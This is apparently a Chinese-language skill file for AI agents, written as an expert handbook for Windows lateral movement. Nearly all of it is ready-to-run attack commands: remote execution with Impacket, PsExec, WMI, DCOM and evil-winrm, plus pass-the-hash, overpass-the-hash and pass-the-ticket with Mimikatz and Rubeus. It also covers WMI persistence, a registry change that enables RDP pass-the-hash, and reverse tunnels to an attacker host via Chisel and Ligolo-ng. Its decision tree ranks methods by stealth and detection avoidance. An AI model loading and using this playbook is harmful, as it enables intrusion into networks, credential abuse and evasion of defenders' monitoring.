# 技能：Windows 横向移动 — 专家攻击手册

> **AI 加载指令**：专家级 Windows 横向移动技术。涵盖 PsExec、WMI、WinRM、DCOM、SMB、RDP、SSH、传递哈希、跨过哈希传递、传递票据和转接。基础模型会遗漏执行方法指纹、OPSEC 权衡以及每种方法所需的凭证类型。

## 0. 相关路由

在深入之前，考虑加载：

- 在新主机上着陆后用于本地提权：[windows-privilege-escalation](../windows-privilege-escalation/SKILL.md)
- 当 EDR 阻止横向移动工具时：[windows-av-evasion](../windows-av-evasion/SKILL.md)
- 用于基于 Kerberos 的横向移动（传递票据、委派）：[active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md)
- 用于基于 ACL 的新主机路径：[active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md)

### 高级参考

当你需要时，也加载 [CREDENTIAL_DUMPING.md](./CREDENTIAL_DUMPING.md)：
- LSASS 倾倒技术（MiniDump、comsvcs.dll、nanodump）
- SAM/SYSTEM/SECURITY 提取
- DPAPI、凭证管理器、缓存的域凭证
- NTDS.dit 提取方法

---

## 1. 远程执行方法比较

| 方法 | 端口 | 凭证类型 | 是否创建服务 | 磁盘文件 | OPSEC | 是否需要管理员权限 |
|---|---|---|---|---|---|---|
| **PsExec** | 445 (SMB) | 密码/哈希 | 是 (PSEXESVC) | 是 (.exe) | 低 | 是 |
| **Impacket smbexec** | 445 | 密码/哈希 | 是 (临时服务) | 否 | 中等 | 是 |
| **Impacket atexec** | 445 | 密码/哈希 | 否 (计划任务) | 否 | 中等 | 是 |
| **WMI** | 135+动态 | 密码/哈希 | 否 | 否 | 高 | 是 |
| **WinRM** | 5985/5986 | 密码/哈希/票据 | 否 | 否 | 高 | 是 (远程管理) |
| **DCOM** | 135+动态 | 密码/哈希 | 否 | 否 | 高 | 是 |
| **RDP** | 3389 | 密码/哈希 (受限管理员) | 否 | 否 | 低 (GUI 会话) | RDP 访问 |
| **SSH** | 22 | 密码/密钥 | 否 | 否 | 高 | SSH 启用 |
| **SC** | 445 | 密码/哈希 | 是 (自定义服务) | 是 | 低 | 是 |

---

## 2. PsExec 变体

### Impacket PsExec

```bash
# 使用密码
psexec.py DOMAIN/administrator:password@TARGET_IP

# 使用 NTLM 哈希 (传递哈希)
psexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP

# 使用 Kerberos 票据
export KRB5CCNAME=admin.ccache
psexec.py -k -no-pass DOMAIN/administrator@target.domain.com
```

### Impacket smbexec (更隐蔽 — 无需上传二进制文件)

```bash
smbexec.py DOMAIN/administrator:password@TARGET_IP
smbexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP
```

### Impacket atexec (计划任务)

```bash
atexec.py DOMAIN/administrator:password@TARGET_IP "whoami"
atexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP "whoami"
```

### Sysinternals PsExec

```cmd
PsExec64.exe \\TARGET -u DOMAIN\administrator -p password cmd.exe
PsExec64.exe \\TARGET -s cmd.exe    & REM 以 SYSTEM 身份运行 (-s)
PsExec64.exe \\TARGET -accepteula -s -d cmd.exe /c "C:\temp\payload.exe"
```

---

## 3. WMI 横向移动

```bash
# Impacket wmiexec
wmiexec.py DOMAIN/administrator:password@TARGET_IP
wmiexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP

# 使用 Kerberos
export KRB5CCNAME=admin.ccache
wmiexec.py -k -no-pass DOMAIN/administrator@target.domain.com
```

```powershell
# PowerShell WMI 进程创建
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt" -ComputerName TARGET -Credential $cred

# WMI 事件订阅持久化
$filterArgs = @{
    EventNamespace = 'root\cimv2'; Name = 'Updater';
    QueryLanguage = 'WQL';
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
```

---

## 4. WinRM 横向移动

```bash
# evil-winrm (从 Linux — 使用密码)
evil-winrm -i TARGET_IP -u administrator -p password

# evil-winrm (使用哈希)
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH

# evil-winrm (使用 Kerberos)
evil-winrm -i target.domain.com -r DOMAIN.COM
```

```powershell
# PowerShell 远程命令
$cred = Get-Credential
Enter-PSSession -ComputerName TARGET -Credential $cred

# 远程执行命令
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }

# 同时对多个目标执行
Invoke-Command -ComputerName TARGET1,TARGET2 -Credential $cred -ScriptBlock { hostname; whoami }
```

---

## 5. DCOM 横向移动

隐蔽性高 — 使用合法的 COM 对象，不创建服务。

### MMC20.Application

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\temp\out.txt","7")
```

### ShellWindows

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\temp\out.txt","C:\Windows\System32",$null,0)
```

### ShellBrowserWindow

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","TARGET"))
$com.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

### Impacket dcomexec

```bash
dcomexec.py DOMAIN/administrator:password@TARGET_IP
dcomexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP -object MMC20
```

---

## 6. 传递哈希 (PTH)

直接使用 NTLM 哈希，无需知道明文密码。

```bash
# CrackMapExec — 喷涂/检查管理员访问
crackmapexec smb TARGETS -u administrator -H NTLM_HASH

# Impacket 工具（所有支持 -hashes）
psexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
wmiexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
smbexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET

# evil-winrm
evil-winrm -i TARGET -u user -H NTLM_HASH

# xfreerdp (受限管理员模式必须启用)
xfreerdp /v:TARGET /u:administrator /pth:NTLM_HASH /d:DOMAIN
```

```cmd
# Mimikatz PTH (生成具有注入凭证的新进程)
sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

### 启用 RDP PTH 的受限管理员

```cmd
# 在目标上（需要管理员权限）：启用受限管理员
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

---

## 7. 跨过哈希 (PASS-THE-KEY)

将 NTLM 哈希 → Kerberos TGT → 纯 Kerberos 身份验证。

```bash
# 使用哈希请求 TGT
getTGT.py DOMAIN/user -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=user.ccache

# 或使用 AES256 密钥
getTGT.py DOMAIN/user -aesKey AES256_KEY -dc-ip DC_IP

# 使用 Kerberos 进行后续所有工具
psexec.py -k -no-pass DOMAIN/user@target.domain.com
wmiexec.py -k -no-pass DOMAIN/user@target.domain.com
```

```cmd
# Mimikatz 跨过哈希
sekurlsa::pth /user:user /domain:DOMAIN /ntlm:HASH /run:powershell.exe
# 新 PowerShell 会话 → klist 显示 Kerberos TGT
```

**优势**：纯 Kerberos 身份验证避免 NTLM 日志和检测。

---

## 8. 传递票据

```bash
# 使用现有的 .ccache 票据
export KRB5CCNAME=/path/to/admin.ccache
psexec.py -k -no-pass DOMAIN/admin@target.domain.com
```

```cmd
# Mimikatz — 注入 .kirbi 票据
kerberos::ptt ticket.kirbi
# 验证
klist

# Rubeus
Rubeus.exe ptt /ticket:base64_blob
```

---

## 9. 通过受感染主机进行转接

### SSH 隧道 / 端口转发

```bash
# 通过受感染主机动态 SOCKS 代理
ssh -D 1080 user@COMPROMISED_HOST
# 使用 proxychains

# 本地端口转发（访问内部服务）
ssh -L 8888:INTERNAL_TARGET:445 user@COMPROMISED_HOST
```

### Chisel (无需 SSH)

```bash
# 在攻击者（服务器）
chisel server --reverse -p 8080

# 在受感染主机（客户端）
chisel client ATTACKER:8080 R:socks
# 在攻击者端口 1080 创建 SOCKS5 代理
```

### Ligolo-ng (现代、快速)

```bash
# 在攻击者
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# 在受感染主机
ligolo-agent -connect ATTACKER:11601 -retry -ignore-cert

# 在 ligolo 控制台
session          # 选择代理
start            # 启动隧道
# 添加路由: sudo ip route add INTERNAL_SUBNET/24 dev ligolo
```

---

## 10. 横向移动决策树

```
有凭证/哈希 — 需要横向移动
│
├── 你有什么凭证？
│   ├── 明文密码 → 任何方法
│   ├── NTLM 哈希 → PTH 方法 (§6)
│   │   ├── 需要更隐蔽？ → 首先使用跨过哈希 (§7)
│   │   └── 直接使用 → psexec/wmiexec/evil-winrm with -H
│   ├── Kerberos 票据 → 传递票据 (§8)
│   └── AES 密钥 → 使用 -aesKey 跨过哈希 (§7)
│
├── OPSEC 优先级？
│   ├── 需要高隐蔽性
│   │   ├── WMI (无磁盘文件、无服务) → wmiexec (§3)
│   │   ├── DCOM (使用合法 COM) → dcomexec (§5)
│   │   └── WinRM (PowerShell 远程命令) → evil-winrm (§4)
│   ├── 中等隐蔽性
│   │   ├── smbexec (无需上传二进制文件) (§2)
│   │   └── atexec (计划任务，自动清理) (§2)
│   └── 可接受低隐蔽性
│       ├── PsExec (可靠，创建服务) (§2)
│       └── RDP (交互式 GUI) (§6)
│
├── 需要转接到内部网络？
│   ├── SSH 可用 → SSH 隧道 / SOCKS (§9)
│   ├── 无 SSH → Chisel 或 Ligolo-ng (§9)
│   └── 多跳 → 链接 SOCKS 代理
│
├── 目标加固？
│   ├── 需要 SMB 签名 → WMI、WinRM 或 DCOM
│   ├── WinRM 禁用 → WMI 或 DCOM
│   ├── 防火墙阻止 135/445 → RDP 或 SSH
│   └── 受限管理员禁用 → 无 RDP PTH → 使用其他方法
│
└── 需要在新主机上倾倒凭证？
    └── 加载 CREDENTIAL_DUMPING.md
```
